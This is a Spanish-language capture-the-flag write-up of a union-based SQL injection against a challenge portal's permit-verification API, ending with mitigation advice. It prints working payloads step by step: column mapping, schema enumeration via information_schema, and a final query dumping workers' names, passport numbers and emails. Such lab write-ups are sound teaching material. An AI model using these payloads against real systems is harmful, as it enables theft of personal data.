---
title: "Utopia Smart City - Work Permits Portal"
description: 'El reto presentaba un portal web para la verificación de permisos de trabajo en una "Smart City". El objetivo era exfiltrar información sensible de los trabajadores. Tras un análisis de la superficie de ataque, se identificó una vulnerabilidad crítica de Inyección SQL (SQLi) en el endpoint de la API encargado de verificar los IDs de los permisos.'
pubDate: 'Jan 25 2026'
heroImage: ''
ctf: 'Fluid Attack 2026'
---
# Writeup: Utopia Smart City - Work Permits Portal

**Categoría:** Web Exploitation

**Dificultad:** Easy

**Puntos:** 335

**Vulnerabilidad:** SQL Injection (Union-Based)

## 1. Resumen Ejecutivo

El reto presentaba un portal web para la verificación de permisos de trabajo en una "Smart City". El objetivo era exfiltrar información sensible de los trabajadores. Tras un análisis de la superficie de ataque, se identificó una vulnerabilidad crítica de **Inyección SQL (SQLi)** en el endpoint de la API encargado de verificar los IDs de los permisos. Esto permitió la ejecución arbitraria de consultas a la base de datos, logrando la extracción total de la tabla de usuarios y la obtención de la flag.

## 2. Reconocimiento y Análisis

### Exploración Inicial

Al navegar por el sitio, se identificó un formulario de búsqueda que interactuaba con el backend mediante una petición GET.
Adicionalmente, la inspección del archivo `robots.txt` reveló la existencia de un directorio `/api/` no indexado.

### Vector de Ataque

El endpoint vulnerable identificado fue:
`GET /api/verify-permit.php?id=[INPUT]`

Al inyectar una comilla simple (`'`) en el parámetro `id`, la aplicación devolvió un error de base de datos detallado (Verbose Error Message).

> **Error Leak:**
> `SQLSTATE[42000]: Syntax error... SELECT wp.permit_number... FROM work_permits wp...`

Este error fue crítico, ya que reveló:

1. El motor de base de datos (MariaDB).
2. La consulta SQL completa.
3. El número exacto de columnas en la proyección (13 columnas).

## 3. Explotación (Union-Based SQLi)

Dado que la aplicación imprimía los resultados de la base de datos en formato JSON, se procedió con un ataque de tipo **UNION Based** para inyectar datos arbitrarios en la respuesta legítima.

### Paso 1: Mapeo de columnas visibles

Se utilizó un ID inexistente (`-1`) para anular la consulta original y un `UNION SELECT` para identificar qué columnas se reflejaban en el JSON.

**Payload:**

```sql
-1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- -

```

**Resultado:**
Se confirmó que varias columnas eran visibles. Se seleccionó la columna número **3** (asignada al campo `job_title` en el JSON) como el punto de extracción de datos.

### Paso 2: Enumeración de la Base de Datos

Se extrajeron los nombres de las tablas existentes en la base de datos actual consultando `information_schema.tables`.

**Payload:**

```sql
-1' UNION SELECT 1,2,group_concat(table_name),4,5,6,7,8,9,10,11,12,13 FROM information_schema.tables WHERE table_schema=database()-- -

```

**Tablas encontradas:** `labor_cards`, `workers`, `work_permits`, `employers`.

### Paso 3: Análisis de la tabla `workers`

Tras descartar `labor_cards` (que contenía datos irrelevantes), el foco se movió a la tabla `workers`. Se enumeraron sus columnas buscando campos sensibles.

**Columnas críticas identificadas:** `first_name`, `last_name`, `passport_number`, `email`.

### Paso 4: Exfiltración de Datos (La Flag)

Se construyó el payload final para extraer y concatenar el nombre del trabajador junto con su número de pasaporte, bajo la hipótesis de que la flag estaría oculta en un campo de identificación personal.

**Payload Final:**

```sql
-1' UNION SELECT 1,2,group_concat(first_name,' | ',passport_number,' | ',email SEPARATOR ' <br> '),4,5,6,7,8,9,10,11,12,13 FROM workers-- -

```

**URL Encoded:**
`api/verify-permit.php?id=-1%27+UNION+SELECT+1,2,group_concat(first_name,%27+%7C+%27,passport_number,%27+%7C+%27,email+SEPARATOR+%27+%3Cbr%3E+%27),4,5,6,7,8,9,10,11,12,13+FROM+workers--+-`

## 4. Resultado

La inyección fue exitosa y el servidor devolvió el siguiente JSON, revelando que el "número de pasaporte" del usuario *Ahmed Hassan* había sido reemplazado por la flag.

```json
"job_title": "Ahmed Hassan | flag{05289a34520161b1} | ahmed.hassan@email.com ..."

```

**Flag:** `flag{05289a34520161b1}`

## 5. Recomendaciones de Seguridad (Mitigación)

Para corregir esta vulnerabilidad en el código fuente (`verify-permit.php`), se recomienda encarecidamente:

1. **Uso de Sentencias Preparadas (Prepared Statements):** Utilizar PDO o MySQLi con parámetros vinculados (`bind_param`) en lugar de concatenar cadenas directamente en la consulta SQL. Esto separa los datos del código ejecutable.
2. **Desactivar Errores Verbosos:** Configurar el servidor de producción para no mostrar errores SQL detallados al usuario final, ya que esto facilita la enumeración de la base de datos.
3. **Validación de Entrada:** Asegurar que el parámetro `id` cumpla con el formato esperado (ej. Regex para `WP-YYYY-NNNNNN`) antes de procesarlo.

---